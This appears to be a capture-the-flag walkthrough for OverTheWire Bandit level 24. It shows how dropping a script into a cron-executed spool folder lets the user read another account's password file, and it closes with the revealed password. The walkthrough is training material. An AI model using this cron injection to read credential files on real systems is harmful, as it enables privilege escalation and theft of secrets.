# Level 24:
Same as before :
```sh
cd /etc/cron.d/
cat /usr/bin/cronjob_bandit24.sh
```

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
```
Let's make our script and inject it into ``/var/spool/bandit24/foo``
```sh
mkdir -p /tmp/bandit23/ && chmod 777 /tmp/bandit23 && cd /tmp/bandit23

echo '#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23/pass' > bandit23.sh

chmod 777 bandit23.sh && cp bandit23.sh /var/spool/bandit24/foo
```
#### Password
*`VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`*
